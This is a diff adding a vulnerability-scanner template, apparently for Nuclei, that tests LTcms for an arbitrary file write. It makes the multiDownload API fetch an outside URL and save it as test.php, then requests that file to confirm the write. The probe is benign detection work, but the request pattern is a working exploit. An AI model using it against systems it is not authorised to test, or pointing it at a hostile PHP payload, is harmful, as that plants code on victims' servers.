@@ -1,0 +1,37 @@
+id: poc-yaml-wanglongcn-ltcms-downloadfile-read
+
+info:
+  name: LTcms Arbitrary File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-file-write,ltcms
+  description: |
+    Exploits a vulnerability in LTcms allowing arbitrary file write via the multiDownload API.
+
+http:
+  - id: step-1-check
+    method: GET
+    path:
+      - "{{BaseURL}}/api/file/multiDownload?file=http://www.baidu.com/&savePath=test.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+
+  - id: step-2-confirm
+    method: GET
+    path:
+      - "{{BaseURL}}/test.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "全球领先的中文搜索引擎、致力于让网民更便捷地获取信息"
+          - "百度一下，你就知道"
